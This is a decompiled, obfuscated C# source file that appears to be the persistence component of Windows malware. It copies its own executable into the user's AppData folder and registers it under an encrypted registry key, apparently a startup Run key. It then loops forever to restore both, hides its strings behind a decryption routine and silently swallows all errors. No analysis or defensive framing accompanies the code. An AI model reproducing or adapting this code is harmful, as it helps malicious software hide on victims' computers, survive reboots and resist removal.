using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns3;

namespace ns4;

internal class Class39
{
	public class Class40
	{
		public static Thread thread_0 = new Thread(smethod_0);

		public static Thread thread_1 = new Thread(smethod_1);

		public static Thread thread_2 = new Thread(smethod_3);

		public static string string_0 = Class6.smethod_0("hsnU08qkerrcwqDOyt4L", "False");

		public static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False");

		public static void smethod_0()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class6.smethod_0("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(string_0, string_1);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_1()
		{
			try
			{
				string text = null;
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class6.smethod_0("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				string[] valueNames = registryKey.GetValueNames();
				registryKey.Close();
				string[] array = valueNames;
				foreach (string text2 in array)
				{
					text = text + text2 + Environment.NewLine;
				}
				if (!text.Contains(string_0))
				{
					thread_0.IsBackground = true;
					thread_0.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_2()
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}

		public static void smethod_3()
		{
			while (true)
			{
				try
				{
					try
					{
						if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
						{
							File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					thread_1.IsBackground = true;
					thread_1.Start();
					double double_ = 15.0;
					Class5.smethod_0(ref double_);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
